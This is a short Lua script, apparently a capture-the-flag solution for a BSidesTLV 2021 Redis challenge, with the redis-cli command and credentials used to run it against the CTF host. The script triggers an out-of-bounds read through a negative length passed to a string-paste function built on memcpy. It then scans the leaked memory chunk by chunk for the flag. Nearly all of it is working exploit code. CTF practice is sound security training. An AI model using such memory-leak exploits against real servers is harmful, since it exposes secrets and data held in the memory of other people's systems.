-- run: redis-cli --user default --pass default-pwd -h rainy-redis.ctf.bsidestlv.com --eval solve.test.lua 

local get_flag = function() 
    -- step 1: prep vars
    local pwnable_str = ''
 
    -- step 2: abusing memcpy to gain a long read primitive
    string.paste('fuckfuck', pwnable_str, 8, -8)
    print('len of pwnable_str :: ' , string.len(pwnable_str))

    -- step 3: scan the leaked mem until profit ( ͡◕ _ ͡◕)👌
    for multiplier = 0,50,1 do     
        local jumpsize = 0x1000    -- skip 0x1000 bytes per iteration
        local from = (jumpsize*multiplier)
        local to   = (jumpsize*multiplier)+jumpsize

        local snapshot = string.sub(pwnable_str, from, to) -- copying the next chunk from memory (size 0x1000)

        print('\n----- from: ', from , 'to: ', to, ' -----')
        print('len of snapshot :: ' , string.len(snapshot))
        print('offsets :: ' , string.find(snapshot, 'BSidesTLV2021'))
        if nil ~= string.find(snapshot, 'BSidesTLV2021') then
            return snapshot -- early return, no need to keep scanning anymore
        end
    end
    return 1
end


return get_flag() -- https://youtu.be/SF3UZRxQ7Rs


